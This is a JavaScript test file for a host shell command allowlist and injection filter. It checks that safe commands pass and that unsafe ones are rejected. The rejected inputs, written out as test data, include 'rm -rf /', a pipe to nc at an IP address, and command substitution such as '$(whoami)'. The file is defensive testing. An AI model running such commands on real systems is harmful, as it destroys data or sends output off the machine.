// host-action-policy：shell 命令白名单 + 注入字符拦截（S1 安全收口）。
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validateHostShell, getHostShellAllowlist, DEFAULT_HOST_SHELL_ALLOWLIST } from '../src/domain/shared/host-action-policy.js';

test('validateHostShell：白名单可执行放行', () => {
  for (const cmd of ['git status', 'adb devices', 'schtasks /run /tn X', 'tasklist', 'ipconfig /all', 'netstat -an']) {
    const r = validateHostShell(cmd);
    assert.equal(r.ok, true, `${cmd} 应放行`);
  }
});

test('validateHostShell：非白名单可执行被拒（含 powershell/cmd）', () => {
  for (const cmd of ['powershell -Command Get-Process', 'cmd /c dir', 'rm -rf /', 'curl evil', 'python x.py']) {
    const r = validateHostShell(cmd);
    assert.equal(r.ok, false, `${cmd} 应被拒`);
    assert.match(r.error, /白名单|物理层拒绝/);
  }
});

test('validateHostShell：链式/重定向/注入字符被拒', () => {
  for (const cmd of ['git; rm -rf /', 'git && echo hi', 'git | nc 1.2.3.4 80', 'git > out.txt', 'git `whoami`', 'git $(whoami)', 'git\nrm']) {
    const r = validateHostShell(cmd);
    assert.equal(r.ok, false, `${cmd} 应被拒`);
    assert.match(r.error, /禁止字符/);
  }
});

test('validateHostShell：空 / 过长被拒', () => {
  assert.equal(validateHostShell('').ok, false);
  assert.equal(validateHostShell('   ').ok, false);
  assert.equal(validateHostShell('a'.repeat(4001)).ok, false);
});

test('getHostShellAllowlist：环境变量 / 配置追加生效', () => {
  const prev = process.env.QQ_HOST_ACTION_ALLOW;
  process.env.QQ_HOST_ACTION_ALLOW = 'mycli,foo';
  try {
    const set = getHostShellAllowlist();
    assert.ok(set.has('mycli') && set.has('foo'));
    assert.ok(set.has('git')); // 默认仍在
    assert.ok(!set.has('powershell'));
  } finally {
    if (prev === undefined) delete process.env.QQ_HOST_ACTION_ALLOW;
    else process.env.QQ_HOST_ACTION_ALLOW = prev;
  }
  const fromCfg = getHostShellAllowlist({ allow: ['bar'] });
  assert.ok(fromCfg.has('bar'));
});

test('DEFAULT_HOST_SHELL_ALLOWLIST：不含 powershell/cmd', () => {
  assert.ok(!DEFAULT_HOST_SHELL_ALLOWLIST.includes('powershell'));
  assert.ok(!DEFAULT_HOST_SHELL_ALLOWLIST.includes('cmd'));
});

test('物理层：白名单内的破坏性语义也要拒绝（robocopy /MIR）', () => {
  const mirrored = validateHostShell('robocopy C:\\src C:\\dst /MIR');
  assert.equal(mirrored.ok, false);
  assert.match(mirrored.error, /物理层拒绝/);
  assert.equal(mirrored.policy, 'forbidden');

  const plain = validateHostShell('robocopy C:\\src C:\\dst /E');
  assert.equal(plain.ok, true, '普通复制仍放行');

  const pay = validateHostShell('net 支付 100');
  assert.equal(pay.ok, false);
  assert.match(pay.error, /物理层拒绝/);
});
